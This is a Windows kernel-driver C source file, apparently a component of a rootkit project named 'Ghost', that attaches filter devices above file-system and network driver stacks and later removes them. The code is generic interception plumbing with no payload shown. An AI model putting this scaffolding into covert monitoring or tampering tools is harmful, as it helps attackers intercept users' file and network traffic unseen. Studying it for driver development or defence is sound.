// filterManager
// Copyright Ric Vieler, 2006
// Attach to file and network drivers

#include "ntddk.h"
#include "Ghost.h"
#include "filterManager.h"

NTSTATUS insertFileFilter(PDRIVER_OBJECT pDriverObject,
	PDEVICE_OBJECT* ppOldDevice,
	PDEVICE_OBJECT* ppNewDevice,
	wchar_t* deviceName)
{
	NTSTATUS			status;
	UNICODE_STRING		unicodeDeviceName;
	HANDLE				fileHandle;
	IO_STATUS_BLOCK		statusBlock = { 0 };
	OBJECT_ATTRIBUTES	objectAttributes = { 0 };
	PFILE_OBJECT		fileObject;

	// Get the device for the specified drive
	RtlInitUnicodeString( &unicodeDeviceName, deviceName );
	InitializeObjectAttributes( &objectAttributes,
		&unicodeDeviceName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL );

	status = ZwCreateFile( &fileHandle,
		SYNCHRONIZE|FILE_ANY_ACCESS, 
		&objectAttributes,
		&statusBlock,
		NULL,
		0,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		FILE_OPEN,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE,
		NULL,
		0 );

	if( !NT_SUCCESS( status ) )
		return status;

	status = ObReferenceObjectByHandle( fileHandle,
		FILE_READ_DATA,
		NULL,
		KernelMode,
		(PVOID *)&fileObject,
		NULL );

	if( !NT_SUCCESS( status ) )
	{
		ZwClose( fileHandle );
		return status;
	}

	*ppOldDevice = IoGetRelatedDeviceObject( fileObject );

	if( !*ppOldDevice )
	{
		ObDereferenceObject( fileObject );
		ZwClose( fileHandle );
		return STATUS_ABANDONED;
	}

	// Create a new device
    status = IoCreateDevice( pDriverObject,
         0,
         NULL,
         (*ppOldDevice)->DeviceType,
         0,
         FALSE,
         ppNewDevice );

    if( !NT_SUCCESS( status ) )
	{
		ObDereferenceObject( fileObject );
		ZwClose( fileHandle );
		return status;
	}

	// Initialize the new device
    if( (*ppOldDevice)->Flags & DO_BUFFERED_IO )
		(*ppNewDevice)->Flags |= DO_BUFFERED_IO;
    if( (*ppOldDevice)->Flags & DO_DIRECT_IO )
		(*ppNewDevice)->Flags |= DO_DIRECT_IO;
    if( (*ppOldDevice)->Characteristics & FILE_DEVICE_SECURE_OPEN )
		(*ppNewDevice)->Characteristics |= FILE_DEVICE_SECURE_OPEN;

	// Attach the new device to the old device
//	status = IoAttachDeviceToDeviceStackSafe( *ppNewDevice, *ppOldDevice, ppOldDevice );
	*ppOldDevice = IoAttachDeviceToDeviceStack( *ppNewDevice, *ppOldDevice );
	if( *ppOldDevice == NULL )
	{
		// Prevent unload if load failed
		IoDeleteDevice( *ppNewDevice );
		*ppNewDevice = NULL;
		// Clean up and return error
		ObDereferenceObject( fileObject );
		ZwClose( fileHandle );
        return STATUS_NO_SUCH_DEVICE;
	}

	ObDereferenceObject( fileObject );
	ZwClose( fileHandle );

	return STATUS_SUCCESS;
}

NTSTATUS insertNetworkFilter(PDRIVER_OBJECT pDriverObject,
	PDEVICE_OBJECT* ppOldDevice,
	PDEVICE_OBJECT* ppNewDevice,
	wchar_t* deviceName)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING unicodeName = { 0 };

	// Create a new device
	status = IoCreateDevice( pDriverObject,
		0,
		NULL,
		FILE_DEVICE_UNKNOWN,
		0,
		TRUE,
		ppNewDevice );

	if( !NT_SUCCESS( status ) )
		return status;

	// Initialize the new device
	((PDEVICE_OBJECT)(*ppNewDevice))->Flags |= DO_DIRECT_IO;

	// Attach the new device
	RtlInitUnicodeString( &unicodeName, deviceName );
	status = IoAttachDevice( *ppNewDevice,
		&unicodeName,
		ppOldDevice );

	// Prevent unload if load failed
	if( !NT_SUCCESS( status ) )
	{
		IoDeleteDevice( *ppNewDevice );
		*ppNewDevice = NULL;
	}

	return status;
}

void removeFilter(PDEVICE_OBJECT* ppOldDevice,
	PDEVICE_OBJECT* ppNewDevice)
{
	IoDetachDevice( *ppOldDevice );
	IoDeleteDevice( *ppNewDevice );
}
